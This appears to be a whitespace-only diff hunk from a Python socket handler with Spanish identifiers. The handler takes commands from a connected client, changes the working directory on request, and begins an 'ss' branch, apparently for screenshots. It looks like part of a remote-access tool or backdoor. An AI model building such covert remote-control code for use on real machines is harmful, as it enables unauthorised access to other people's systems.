@@ -58,8 +58,10 @@ def escucha(cliente):
                     os.chdir(ruta.strip())
 
                     cliente.send(f'\n[!] nueva ruta>> {ruta}\n'.encode())
+
                 except Exception as e:
                     cliente.send(f'\n[!] error cambiando el directorio de trabajo:\n{e}\n'.encode())
+                    
             elif señal == 'ss':
                 
                 try:
